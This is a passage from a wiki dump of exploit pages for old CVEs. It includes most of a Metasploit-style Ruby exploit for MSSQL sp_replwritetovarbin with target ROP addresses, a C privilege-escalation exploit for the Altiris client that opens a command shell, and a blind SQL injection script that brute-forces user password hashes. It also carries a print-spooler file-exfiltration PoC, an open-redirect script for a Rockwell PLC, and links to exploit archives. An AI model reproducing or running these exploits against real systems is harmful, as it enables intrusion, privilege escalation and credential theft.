            # Microsoft SQL Server  2000 - 8.00.760 (Intel X86)
            # Dec 17 2002 14:22:05
            'MSSQL 2000 / MSDE SP3 (8.00.760)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; -13,         # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x38,        # displacement from call [eax+0x38] crash
              'Writable' =&gt; 0x42b6cfe0,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x00ac344e,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x490074,    # not directly used - call [ecx+0x14]
              'Disp'     =&gt; 0x34,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x00454303,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
              'Popped'   =&gt; 0x8,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x28,        # offset to the new stack!
              'FixESP'   =&gt; 0x00503413,  # advance esp to next ret (add esp,0x20 / ret)
              'Ret'      =&gt; 0x0043fa97   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)
            # May  3 2005 23:18:38
            'MSSQL 2000 / MSDE SP4 (8.00.2039)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; -13,         # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x38,        # displacement from call [eax+0x38] crash
              'Writable' =&gt; 0x42b6cfe0,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x0046592e,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x69f5e8,    # not directly used - call [ecx+0x14]
              'Disp'     =&gt; 0x14,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x007b39a8,  # push ecx / pop esp / mov ax,[eax+0x18] / mov [ecx+0x62],ax / pop ebp / ret 0x4
              'Popped'   =&gt; 0x4,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x20,        # offset to the new stack!
              'FixESP'   =&gt; 0x00b3694d,  # advance esp to next ret (add esp,0x20 / ret)
              'Ret'      =&gt; 0x0047c89d   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
            # Oct 14 2005 00:33:37
            'MSSQL 2005 SP0 (9.00.1399.06)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; 63,          # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
              'Writable' =&gt; 0x53ad5330,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x02201ca8,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x10e860f,   # not directly used - call [ecx+0x14]
              'Disp'     =&gt; 0x50,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x0181c0d4,  # push ecx / pop esp / pop ebp / ret
              'Popped'   =&gt; 0x4,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x20,        # offset to the new stack!
              'FixESP'   =&gt; 0x0147deb7,  # advance esp to next ret (add esp,0x10 / ret)
              'Ret'      =&gt; 0x0112c2c7   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86)
            # Apr 14 2006 01:12:25
            'MSSQL 2005 SP1 (9.00.2047.00)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; 63,          # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
              'Writable' =&gt; 0x53ad5330,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x0244c803,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x17139e9,   # not directly used - call [ecx+0x14]
              'Disp'     =&gt; 0x52,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x0183bf9c,  # push ecx / pop esp / pop ebp / ret
              'Popped'   =&gt; 0x4,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x20,        # offset to the new stack!
              'FixESP'   =&gt; 0x014923c1,  # advance esp to next ret (add esp,0x10 / ret)
              'Ret'      =&gt; 0x011b204c   # jmp esp
            },
          ],

          [
            # Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86)
            # Feb  9 2007 22:47:07
            'MSSQL 2005 SP2 (9.00.3042.00)',
            {
              'Num'      =&gt; 32,          # value for "start_offset"
              'VtOff'    =&gt; 63,          # offset from 'Num' to smashed vtable ptr
              'VtDisp'   =&gt; 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
              'Writable' =&gt; 0x53ad5330,  # any writable addr (not even necessary really)
              'Vtable'   =&gt; 0x027fca52,  # becomes eax for [eax+0x38] (must be valid to exec)
              'FixDisp'  =&gt; 0x1106d6b,   # not directly used - call [ecx+0x14]
              'Disp'     =&gt; 0x52,        # displacement on call [ecx+disp] used
              'ecx2esp'  =&gt; 0x01849641,  # push ecx / pop esp / pop ebp / ret
              'Popped'   =&gt; 0x4,         # byte count popped in above (before ret)
              'Offset'   =&gt; 0x20,        # offset to the new stack!
              'FixESP'   =&gt; 0x01498b22,  # advance esp to next ret (add esp,0x10 / ret)
              'Ret'      =&gt; 0x010a5379   # jmp esp
            },
          ],

          [ 'CRASHER', { } ]
        ],
      'DefaultTarget'  =&gt; 0,
      'DisclosureDate' =&gt; 'Dec 09 2008'
      ))

    register_options(
      [
        OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ])
      ])
  end

  def check
    # the ping to port 1434 method has two drawbacks...
    # #1, it doesn't work on mssql 2005 or newer (localhost only listening)
    # #2, it doesn't give an accurate version number (sp/os)

    # since we need to have credentials for this vuln, we just login and run a query
    # to get the version information
    if not (version = mssql_query_version)
      return Exploit::CheckCode::Safe
    end
    print_status("@@version returned:\n\t" + version)

    # Any others?
    return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.194/)
    return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.384/)
    return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.534/)
    return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.760/)
    return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.2039/)
    return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.1399\.06/)
    return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.2047\.00/)
    return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.3042\.00/)
    return Exploit::CheckCode::Safe
  end

  def exploit

    mytarget = nil
    if target.name =~ /Automatic/
      print_status("Attempting automatic target detection...")

      version = mssql_query_version
      raise RuntimeError, "Unable to get version!" if not version

      if (version =~ /8\.00\.194/)
        mytarget = targets[1]
      elsif (version =~ /8\.00\.384/)
        mytarget = targets[2]
      elsif (version =~ /8\.00\.534/)
        mytarget = targets[3]
      elsif (version =~ /8\.00\.760/)
        mytarget = targets[4]
      elsif (version =~ /8\.00\.2039/)
        mytarget = targets[5]
      elsif (version =~ /9\.00\.1399\.06/)
        mytarget = targets[6]
      elsif (version =~ /9\.00\.2047\.00/)
        mytarget = targets[7]
      elsif (version =~ /9\.00\.3042\.00/)
        mytarget = targets[8]
      end

      if mytarget.nil?
        raise RuntimeError, "Unable to automatically detect the target"
      else
        print_status("Automatically detected target \"#{mytarget.name}\"")
      end
    else
      mytarget = target
    end

    sqlquery = %Q|declare @i int,@z nvarchar(4000)
set @z='declare @e int,@b varbinary,@l int;'
set @z=@z+'exec sp_replwritetovarbin %NUM%,@e out,@b out,@l out,''%STUFF%'',@l,@l,@l,@l,@l,@l,@l,@l'
exec sp_executesql @z|

    # just crash it with a pattern buffer if the CRASHER target is selected..
    if mytarget.name == 'CRASHER'
      sploit = Rex::Text.pattern_create(2048)
      print_status("Attempting to corrupt memory to cause an exception!")
      num = 32
    else
      # trigger the memory corruption
      num = mytarget['Num']
      vt_off = mytarget['VtOff']
      vt_disp = mytarget['VtDisp']
      vtable = mytarget['Vtable']
      ecx_disp = mytarget['Disp']
      esp_off = mytarget['Offset']
      hijack_esp = mytarget['ecx2esp']
      first_esp = mytarget['Popped']
      fix_esp = mytarget['FixESP']
      writable = mytarget['Writable']
      corruptable_bytes = 0x44

      # make sploit buff
      sz = (num + vt_off) + esp_off + (2 + corruptable_bytes) + payload.encoded.length
      #sploit = Rex::Text.pattern_create(sz)
      sploit = rand_text_alphanumeric(sz)

      # remove displacement! (using call [ecx+displacement])
      vtable_off = (num + vt_off)
      sploit[vtable_off,4] = [(vtable - vt_disp)].pack('V')

      # stack -&gt; heap
      hijack_off = vtable_off + ecx_disp
      sploit[hijack_off,4] = [hijack_esp].pack('V')
      # becomes eax on mssql 2ksp4 (prevent crash)
      sploit[(vtable_off-4),4] = [writable].pack('V')

      # becomes eip after esp hijack
      fixesp_off = vtable_off + first_esp
      sploit[fixesp_off,4] = [fix_esp].pack('V')

      # rest of magic stack (disable DEP?)
      stack_off = vtable_off + esp_off
      stack = []
      stack &lt;&lt; mytarget['Ret']
      stack = stack.pack('V*')
      # jump over the stuff that gets corrupted
      stack &lt;&lt; "\xeb" + [corruptable_bytes].pack('C')
      stack &lt;&lt; rand_text_alphanumeric(corruptable_bytes)
      stack &lt;&lt; payload.encoded
      sploit[stack_off,stack.length] = stack

      # this has to be put in after the stack area since the ptr for sql2k sp1 is in the corrupted stuff
      sploit[hijack_off,4] = [hijack_esp].pack('V')

      print_status("Redirecting flow to %#x via call to our faked vtable ptr @ %#x" % [mytarget['FixDisp'], vtable])
    end

    # encode chars that get modified
    enc = mssql_encode_string(sploit)

    # put the number in (start offset)
    runme = sqlquery.gsub(/%NUM%/, num.to_s)
    runme.gsub!(/%STUFF%/, enc)

    # go!
    print_status('The SQL Server will probably die after exploitation. Follow the "POSTEXPLOITATION" instructions in the README file')
    begin
      mssql_query(runme, datastore['VERBOSE'])
    rescue ::Errno::ECONNRESET, EOFError
      print_error("Error: #{$!}")
    end

    handler
    disconnect
  end


  def mssql_str_to_chars(str)
    ret = ""
    str.unpack('C*').each do |ch|
      ret += "+" if ret.length &gt; 0
      ret += "char("
      ret &lt;&lt; ch.to_s
      ret += ")"
    end
    return ret
  end


  def mssql_encode_string(str)
    badchars = "\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"

    enc = ""
    in_str = true
    str.unpack('C*').each do |ch|
      # double-double single quotes
      if ch == 0x27
        if not in_str
          enc &lt;&lt; "+'"
          in_str = true
        end
        enc &lt;&lt; ch.chr * 4
        next
      end

      # double backslashes
      if ch == 0x5c
        if not in_str
          enc &lt;&lt; "+'"
          in_str = true
        end
        enc &lt;&lt; ch.chr * 2
        next
      end

      # convert any bad stuff to char(0xXX)
      if ((idx = badchars.index(ch.chr)))
        enc &lt;&lt; "'" if in_str
        enc &lt;&lt; "+char(0x%x)" % ch
        in_str = false
      else
        enc &lt;&lt; "+'" if not in_str
        enc &lt;&lt; ch.chr
        in_str = true
      end
    end
    enc &lt;&lt; "+'" if not in_str
    return enc
  end


  def mssql_query_version
    
    delay = 5

    # Let's first check that we can reach the host with no problems
    t = Time.now
    res = mssql_query("select @@version",datastore['VERBOSE'])
    response_time = Time.now-t
    if (response_time &gt; delay)
      return nil
    end

    # Now we test the SQL Server versions
    versions = %w[8.00.194 8.00.384 8.00.534 8.00.760 8.00.2039 9.00.1399.06 9.00.2047.00 9.00.3042.00]
    versions.each_with_index { |version,i|
      t = Time.now
      res = mssql_query("if ((select PATINDEX('%#{version}%', @@version))&gt;0)WAITFOR DELAY '00:00:#{delay.to_s}'",datastore['VERBOSE'])
      response_time = Time.now-t
      if (response_time &gt; delay)
        return version
      end
    }

    return nil
  end

end
&lt;/pre&gt;</text>
      <sha1>5lw7vemjqwzeuheypgw0xs79zia9aqv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-6827 Symantec Altiris Deployment Solution 6.x權限提升漏洞</title>
    <ns>0</ns>
    <id>656</id>
    <revision>
      <id>887</id>
      <timestamp>2021-04-02T03:19:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; // 0day PRIVATE NOT DISTRIBUTE!!! // // Symantec Altiris Client Service Local Exploit (0day)  // // Affected Versions	: Altiris Client 6.5.248 //			  Altiris Cli..."</comment>
      <origin>887</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4471" sha1="gmh066ecdh2aw5h156b1z8rc21l9dpw" xml:space="preserve">==EXP==
&lt;pre&gt;
// 0day PRIVATE NOT DISTRIBUTE!!!
//
// Symantec Altiris Client Service Local Exploit (0day) 
//
// Affected Versions	: Altiris Client 6.5.248
//			  Altiris Client 6.5.299
//			  Altiris client 6.8.378
//
// Alex Hernandez aka alt3kx 
// ahernandez [at] sybsecurity.com
//
// Eduardo Vela aka sirdarckcat 
// sirdarckcat [at] gmail.com
//
// We'll see you soon at ph-neutral 0x7d8

#include "stdio.h"
#include "windows.h"

int main(int argc, char* argv[])
{
 HWND lHandle, lHandle2;
 POINT point;
 int id,a=0;
 char langH[255][255];
 char langO[255][255];
 char wname[]="Altiris Client Service";
 
 strcpy(langH[0x0c],"Aide de Windows");
 strcpy(langH[0x09],"Windows Help");
 strcpy(langH[0x0a],"Ayuda de Windows");
 
 strcpy(langO[0x0c],"Ouvrir");
 strcpy(langO[0x09],"Open");
 strcpy(langO[0x0a],"Abrir");
 
 printf("##########################################################\n");
 printf("#                  Altiris Client Service                #\n");
 printf("# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\n");
 printf("# by sirdarckcat &amp; alt3kx                                #\n");
 printf("#                                                        #\n");
 printf("# This exploit is based on www.milw0rm.com/exploits/350  #\n");
 printf("# Utility Manager Privilege Elevation Exploit (MS04-019) #\n");
 printf("# by Cesar Cerrudo                                       #\n");
 printf("##########################################################\n\n");
  
 id=PRIMARYLANGID(GetSystemDefaultLangID());
 if (id==0 &amp;&amp; (id=PRIMARYLANGID(GetUserDefaultLangID()))){
    printf("Lang not found, using english\n");
    id=9;
 }

 char sText[]="%windir%\\system32\\cmd.ex?";

 if (argc&lt;2){
    printf("Use:\n&gt; %s [LANG-ID]\n\n",argv[0]);
    printf("Look for your LANG-ID here:\n");
    printf("http://msdn2.microsoft.com/en-us/library/ms776294.aspx\n");
    printf("\nAnyway, the program will try to guess it.\n\n");
    return 0;
 }else{
    if (argc==2){
       if (langH[atoi(argv[1])]){
          id=atoi(argv[1]);
          printf("Lang changed\n");
       }else{
          printf("Lang not supported\n",id);
       }
    }
 }
 printf("Using Lang %d\n",id);
 printf("Looking for %s..\n",wname);
 lHandle=FindWindow(NULL, wname);   
 if (!lHandle) {
  printf("Window %s not found\n", wname);
  return 0;
 }else{
  printf("Found! exploiting..\n");
 }
 PostMessage(lHandle,0x313,NULL,NULL);
 
 Sleep(100);

 SendMessage(lHandle,0x365,NULL,0x1);
 Sleep(300);
 pp:
 if (!FindWindow(NULL, langH[id])){
    printf("Help Window not found.. exploit unsuccesful\n");
    if (id!=9){
       printf("Trying with english..\n");
       id=9;
       goto pp;
    }else{
          return 0;
    } 
 }else{
    printf("Help Window found! exploiting..\n");
 } 
 SendMessage (FindWindow(NULL, langH[id]), WM_IME_KEYDOWN, VK_RETURN, 0);
 Sleep(500);
 lHandle = FindWindow("#32770",langO[id]);
 lHandle2 = GetDlgItem(lHandle, 0x47C);
 Sleep(500);
 printf("Sending path..\n");
 SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)sText);
 Sleep(800);
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
 lHandle2 = GetDlgItem(lHandle, 0x4A0);
 printf("Looking for cmd..\n"); 
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
 Sleep(500);
 lHandle2 = FindWindowEx(lHandle,NULL,"SHELLDLL_DefView", NULL);
 lHandle2 = GetDlgItem(lHandle2, 0x1);
 printf("Sending keys..\n");
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0);
 Sleep(500);
 mark:
 PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
 Sleep(1000);
 point.x =10; point.y =30;
 lHandle2=WindowFromPoint(point);
  Sleep(1000);
 printf("Opening shell..\n");
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0);
  Sleep(1000);
 if (!FindWindow(NULL,"C:\\WINDOWS\\system32\\cmd.exe") &amp;&amp; !FindWindow(NULL,"C:\\WINNT\\system32\\cmd.exe")){
    printf("Failed\n");
    if (!a){
        a++;
        goto mark;
    }
 }else{
       printf("Done!\n");
 }
 if(!a){
    SendMessage (lHandle, WM_CLOSE,0,0);
    Sleep(500);
    SendMessage (FindWindow(NULL, langH[id]), WM_CLOSE, 0, 0);
    SendMessage (FindWindow(NULL, argv[1]), WM_CLOSE, 0, 0);
 }else{
    printf("The exploit failed, but maybe the context window of the shell is visibile.\n");
 }
 return 0;
}

// milw0rm.com [2008-05-15]
&lt;/pre&gt;</text>
      <sha1>gmh066ecdh2aw5h156b1z8rc21l9dpw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-6970 UBB.threads 7.3.1 SQL注入漏洞</title>
    <ns>0</ns>
    <id>657</id>
    <revision>
      <id>888</id>
      <timestamp>2021-04-02T03:21:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt;  DESCRIPTION  Exploits PHP parameter input validation flaw and blindly brute force stored MD5 SQL hash for given user ID.   FILE  &lt;pre&gt; CVE-2008-6970.sh - Shell..."</comment>
      <origin>888</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1884" sha1="c6s04pufkq1jqkvv0otsn8v990bzkqo" xml:space="preserve">==INFO==
&lt;pre&gt;

DESCRIPTION

Exploits PHP parameter input validation flaw and blindly brute force stored MD5 SQL hash for given user ID. 

FILE

&lt;pre&gt;
CVE-2008-6970.sh - Shell code program.
&lt;/pre&gt;

SOURCE

https://github.com/KyomaHooin/CVE-2008-6970


&lt;/pre&gt;


==CVE-2008-6970.sh==
&lt;pre&gt;
#!/bin/sh
#
# UBB 7.3.1 dosearch.php blind SQL injection brute force attack
#

hex=(A B C D E F 0 1 2 3 4 5 6 7 8 9)
main='http://[removed]/ubbthreads/ubbthreads.php'
login='ubb=start_page&amp;Loginname=[removed]&amp;Loginpass=[removed]&amp;firstlogin=1&amp;from=http%3A%2F%2F[removed]%2Fubbthreads%2Fubbthreads.php%3Fubb%3Ddosearch%26amp%3Bfromsearch%3D1%26amp%3BWords%3Dmove%26amp%3BForum%5B%5D%3Df2%2527%29%29%2Band%2B1%253D1%2F*&amp;buttlogin=Log+In'
base="$main?ubb=dosearch&amp;fromsearch=1&amp;Words=body"
inject="&amp;Forum[]=f2')) AND (SELECT 1 FROM w3t_USERS WHERE USER_ID%3D3 AND UPPER(USER_PASSWORD) LIKE 'R%')%3D1/*"

hash=()

replace(){
	echo $1 | sed "s/LIKE '\(_*\)\(.*\)%'/LIKE '\1$2%'/"
}

push(){
	echo $1 | sed "s/LIKE '\(_*\)\(.*\)%'/LIKE '\1_$2%'/"
}

brute(){
	for char in ${hex[*]}; do
		#replace string
		inj=`replace "$inject" $char`
		#inject
		wget -O ubb --load-cookies cookies.txt --keep-session-cookies --save-cookies cookies.txt "$base$inj"
		#if match then return characters to hash array
		if [ -z `cat ubb | grep "There are no results"` ]; then
			hash+=($char)
			return
		fi
		rm ubb
	done
}

# INIT

#get PHPSESSID cookie
wget -O /dev/null --keep-session-cookies --save-cookies cookies.txt $main
#login &amp; get UBB cookies &amp; inject SQL to bypass dosearch.inc.php access restriction
wget -O /dev/null --load-cookies cookies.txt --keep-session-cookies --save-cookies cookies.txt --post-data=$login $main
#blind SQL injection brute force attack
for ((i=0; i&lt;32;i++)); do
	brute
	inject=`push "$inject" "R"`
done
#clean
rm cookies.txt
#print the hash
printf "%s" "${hash[@]}" &gt;&gt; hash.txt


&lt;/pre&gt;</text>
      <sha1>c6s04pufkq1jqkvv0otsn8v990bzkqo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2008-7220 Prototype JavaScript 跨站Ajax請求漏洞</title>
    <ns>0</ns>
    <id>658</id>
    <revision>
      <id>889</id>
      <timestamp>2021-04-02T03:26:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2008-7220.zip"</comment>
      <origin>889</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="2ekrqfn4x48erwflspcl6rmlnklysm7" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2008-7220.zip</text>
      <sha1>2ekrqfn4x48erwflspcl6rmlnklysm7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-0229 Microsoft Windows 2000 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>659</id>
    <revision>
      <id>890</id>
      <timestamp>2021-04-02T03:28:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2009-0229-PoC PoC for CVE-2009-0229 "Print Spooler Read File Vulnerability" LPE AFR (related to CVE-2020-1048)   ## Details * Author: Andrei Costin (zveri..."</comment>
      <origin>890</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5040" sha1="h2oqeepbdr3gx8io7et6fbjijwheb3j" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2009-0229-PoC
PoC for CVE-2009-0229 "Print Spooler Read File Vulnerability" LPE AFR (related to CVE-2020-1048)


## Details
* Author: Andrei Costin (zveriu@gmail.com)
    * https://twitter.com/costinandrei/
* PoC date: 2010-xx-xx
* Release date: 2020-05-14 (reminded/inspired by CVE-2020-1048 - yes, I am too late to the party :D )
* TL;DR
    * If you want 0days, dig Printing and Faxing sub-system of OSes :) - lots of legacy code due to historical reasons - there are vulns for everyone =)

# Notes
* Note1: Unverified - unsure 100% is the same bug that triggers the CVE-2009-0229

* Note2: Unverified - could work on newer systems like Windows Server 2012 and Windows Server 2016

* Note3: All Windows releases come with 4 default "Separator Page" files
    * pcl.sep
    * pscript.sep
    * sysprint.sep
    * sysprtj.sep

* Note4: This trick is older than Windows 95 =), pretty sure it was used by pros for "stealth info recovery" ;)


## Pre-requisites
* (non-admin) local attacker has "printer management rights"
    * option1: can add a new printer
    * option2: can modify settings of an existing "system wide" printer (many times the case)
* "arbitrary file" for exfiltration does not have explicit "Deny Read" permission
    * highly unlikely as that would make accessing files for the victim really unpractical/unusable


## PoC Execution
* Local attacker configures any printer s/he has access to so that it uses "Separator Page" file supplied by the attacker (attack.sep), now attacker has "weaponized printer"
   * See "Windows "Separator Page" References" below for details

* Local attacker crafts the "Separator Page" file (attack.sep) to use the "@F"/"$F" operator, as follows, where the file to be exfiltrated is assumed to be "C:\secret.txt" (notice the \\ and the direct concatenation to @F operator)
```
@
@FC:\\secret.txt
```

* Local attacker needs to print something using the "weaponized" printer above
    * For example, local attacker opens Notepad, prints the empty document through the printer configured above with "Separator Page" file
    * Local attacker uses the "print to file" (e.g., c:\temp\exfiltrated.out) option when printing - there are "print to file" .ps in most Windows versions + .xps in newer ones (http://ps-2.kev009.com/pcpartnerinfo/ctstips/e94a.htm)
        * This is done so that the content of the exfiltrated file does not go to the printer (though this is also an option), but becomes immediately available to the attacker

* Attack improvement: one "Separator Page" file can have a brute-force list of most common filepaths/filenames
* There is also @L operator :)
   * see my "PostScript: Danger Ahead?!" https://scholar.google.fr/scholar?oi=bibs&amp;hl=en&amp;q=related:RGJbW-sFP9sJ:scholar.google.com/
   * see also pscript.sep and sysprint.sep


## Trivia
* Found back in 2010 when I was doing "Hacking Printers for Fun and Profit" research/talks
    * https://www.youtube.com/watch?v=R56ZXErKCeE
    * https://www.youtube.com/watch?v=KrWFOo2RAnk 
    * https://www.youtube.com/watch?v=JcfxvZml6-Y
    * http://andreicostin.com/papers/Conf%20-%20EuSecWest2010_AndreiCostin_HackingPrintersForFunAndProfit_full.pdf
    * found independently from CVE-2009-0229 submitter - until today, I did not know there is this CVE-2009-0229 =)), thought I was sitting on a 0day =))

* I am pretty sure the Printing and Faxing sub-systems are bug-trapped with vulns back since Windows 3.1 (for historical reasons)


## Security References
* "Microsoft Security Bulletin MS09-022 - Critical"
    * https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-022
    * https://support.microsoft.com/de-ch/help/961501
* CVE-2009-0229
    * https://nvd.nist.gov/vuln/detail/CVE-2009-0229
    * https://vuldb.com/?id.48511

* CVE-2020-1048
    * https://windows-internals.com/printdemon-cve-2020-1048/

## Windows "Separator Page" References
* This is how "Separator Page" dialogs look on various Windows versions
    * https://www.google.com/search?q=%22Separator+Page%22+windows&amp;source=lnms&amp;tbm=isch
* This is how "Print to file" looks in some Windows versions
    * http://ps-2.kev009.com/pcpartnerinfo/ctstips/e94a.htm
* "Separator Page" in "Hands-On Microsoft Windows Server 2016 By Michael Palmer"
    * https://books.google.fi/books?id=zi-dBAAAQBAJ&amp;pg=PA267&amp;lpg=PA267&amp;dq=%22SYSPRTJ.SEP%22+windows+10&amp;source=bl&amp;ots=TUGyElUQdc&amp;sig=ACfU3U0WMpu6Y3EY5vo5MAJxNE04DjRtbg&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwid6arL6LPpAhUPAxAIHaF9AXYQ6AEwA3oECAcQAQ#v=onepage&amp;q=%22SYSPRTJ.SEP%22%20windows%2010&amp;f=false
* "Create Custom Separator Pages in Windows Server 2012/2016"
    * https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj149734(v=ws.11)?redirectedfrom=MSDN
* "Use a Separator Page When Printing in Windows"
    * https://computingondemand.com/use-a-separator-page-when-printing-in-windows/
* "How do I configure a Print Separator Page?"
    * https://www.itprotoday.com/cloud-computing/how-do-i-configure-print-separator-page

&lt;/pre&gt;</text>
      <sha1>h2oqeepbdr3gx8io7et6fbjijwheb3j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-0473 Rockwell Automation ControlLogix 1756-ENBT/A EtherNet/IP Bridge Module 重定向漏洞</title>
    <ns>0</ns>
    <id>660</id>
    <revision>
      <id>891</id>
      <timestamp>2021-04-02T03:31:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; ## Description Simple script to exploit open redirection vulnerability in Rockwell ControlLogix 1756-ENBT/A.  ##Vulnerability Details https://www.cvedetails.com..."</comment>
      <origin>891</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1299" sha1="4m3d4aki9svgvm7wktv3omd3sqlkiko" xml:space="preserve">==INFO==
&lt;pre&gt;
## Description
Simple script to exploit open redirection vulnerability in Rockwell ControlLogix 1756-ENBT/A.

##Vulnerability Details
https://www.cvedetails.com/cve/CVE-2009-0473/

###Requirements
* Python 2.7
* You must be running an X Windows environment before executing this script.
* It will use Python’s “webbrowser” library to open the site using the default browser.

&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#Author : Akbar Qureshi

import webbrowser
import urllib2

class colors:
    alert = '\033[93m'
    end = '\033[0m'    
print colors.alert + """
###########################################################################
# Description: This script will exploit the open redirction vulnerability #
#	       in Rockwell ControlLogix 1756-ENBT/A			  #
# CVE Details: https://www.cvedetails.com/cve/CVE-2009-0473/      	  #
###########################################################################
""" + colors.end

plcurl = raw_input("Enter the plc web interface url: ")
try:
        url = urllib2.urlopen('http://%s' % plcurl, timeout=5)
except:
        print "Cannot open url,please try again"
else:
        open_redir = raw_input("Enter open redirection URL: " )
        url = "http://%s/index.html?redirect=//%s" % (plcurl,open_redir)
        webbrowser.open(url,new=1)

&lt;/pre&gt;</text>
      <sha1>4m3d4aki9svgvm7wktv3omd3sqlkiko</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-1244 VMware Workstation 6.5.1任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>661</id>
    <revision>
      <id>892</id>
      <timestamp>2021-04-02T03:36:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # vmware_exploit_pack_CVE-2009-1244 vmware cloudburst exploit CVE-2009-1244   hackto in the .exe - video here: https://vimeo.com/6595412  &lt;/pre&gt;  ==EXP== https:..."</comment>
      <origin>892</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="235" sha1="3xu8af6hx0yogaghsr9yj4i146ke12r" xml:space="preserve">==INFO==
&lt;pre&gt;
# vmware_exploit_pack_CVE-2009-1244
vmware cloudburst exploit CVE-2009-1244


hackto in the .exe - video here: https://vimeo.com/6595412

&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2009-1244.zip</text>
      <sha1>3xu8af6hx0yogaghsr9yj4i146ke12r</sha1>
    </revision>
  </page>
  <page>
